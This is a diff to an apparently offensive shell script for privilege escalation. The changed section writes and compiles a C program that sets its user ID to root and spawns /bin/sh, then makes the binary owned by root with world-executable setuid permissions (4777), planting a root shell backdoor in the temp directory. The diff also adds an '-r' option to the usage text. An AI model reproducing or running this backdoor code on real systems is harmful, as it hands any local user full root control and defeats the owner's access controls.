@@ -103,7 +103,7 @@ if [ "$PASSED_ARGS" != "" ]; then
     case "$opt" in
       h|\?)
         echo
-        echo "Usage: sh $0 [-h] [-e] [-s] [-u] [-p]"
+        echo "Usage: sh $0 [-h] [-e] [-r] [-s] [-u] [-p]"
         echo
         echo "-e <username>"
         echo "  Elevate privileges of the given user"
@@ -369,15 +369,17 @@ if [ "$ROOTSHELL" ]; then
   else
     echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
   fi
-  $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null
-  rm $TMPDIR/morannon.c
-  
-  if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
-    ROOTSHELLOK="1" && fuINFO "root shell created"
+  if $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null; then
+    fuMESSAGE "root shell \"$TMPDIR/morannon\" created"
   else
-    ROOTSHELLOK="" && fuERROR "root shell not created"
-  fi 
-
+    fuERROR "root shell not created"
+  fi
+  rm $TMPDIR/morannon.c
+  if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
+    ROOTSHELLOK="1" && fuINFO "root shell \"$TMPDIR/morannon\" usable"
+  else
+    ROOTSHELLOK="" && fuERROR "root shell not usable"
+  fi
 fi
 
 
